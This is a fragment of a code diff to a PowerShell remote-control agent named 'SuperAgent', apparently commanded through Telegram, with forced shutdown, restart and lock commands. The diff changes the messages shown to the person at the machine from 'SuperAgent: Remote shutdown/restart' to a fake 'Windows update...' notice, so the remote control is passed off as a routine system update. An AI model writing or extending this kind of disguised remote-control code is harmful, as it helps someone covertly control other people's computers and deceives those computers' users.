@@ -709,11 +709,11 @@ Add-Type -AssemblyName System.Windows.Forms
                     switch ($cmd) {
                         '/shutdown' {
                             Send-Telegram "[$PCName] Shutting down..."
-                            shutdown /s /t 3 /f /c 'SuperAgent: Remote shutdown'
+                            shutdown /s /t 3 /f /c 'Windows update...'
                         }
                         '/restart' {
                             Send-Telegram "[$PCName] Restarting..."
-                            shutdown /r /t 3 /f /c 'SuperAgent: Remote restart'
+                            shutdown /r /t 3 /f /c 'Windows update...'
                         }
                         '/lock' {
                             $ok = Invoke-Lock
